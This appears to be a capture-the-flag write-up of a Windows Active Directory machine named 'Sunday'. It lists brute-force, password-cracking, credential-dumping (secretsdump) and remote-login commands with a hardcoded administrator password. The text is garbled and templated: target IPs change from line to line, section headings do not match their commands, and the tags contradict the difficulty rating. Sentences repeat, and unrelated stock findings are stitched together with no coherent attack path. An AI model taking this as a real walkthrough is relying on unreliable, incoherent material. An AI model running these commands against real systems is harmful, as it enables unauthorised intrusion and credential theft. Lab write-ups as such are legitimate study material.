---
TitleSEO: "PwnTillDawn — Sunday (Easy Windows) | ZureFX"
TitlePost: "PwnTillDawn — Sunday (Easy Windows)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Sunday. DCSync and Constrained Delegation to achieve easy compromise on Windows."
Keywords: "offsec, pwntilldawn, medium, insane, active directory, reversing"
URL: "https://zurefx.github.io/writeups/htb-sunday-395.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-sunday-395/"
Date: "2024-06-22"
Tags: "OffSec, PwnTillDawn, Medium, Insane, Active Directory, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-sunday-395"
Permalink: "/writeups/htb-sunday-395.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Sunday** is rated **Easy** on PwnTillDawn. It runs **Windows** and the IP address during this analysis was `10.89.13.45`.

### Objectives

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.227.187 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Service Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.113.36.247/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.123.194.224 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file.

### SMB Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.98.161.63
```

Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file. The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **Constrained Delegation**.

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.

### Initial Access

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
gobuster dir -u http://10.95.31.49/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.26.234.138/FUZZ
```

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.12.33.3
impacket-secretsdump administrator:'P@ssw0rd!'@10.44.227.118
evil-winrm -i 10.74.65.14 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p22,3268,464 10.85.231.50 -oN scan.txt
```

Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Summary

### Tools Used

- `wmiexec`
- `socat`
- `hydra`
- `rubeus`
- `pwncat`
- `GetNPUsers`
- `GetUserSPNs`
- `nikto`

### Key Takeaways

- DCSync
- Constrained Delegation
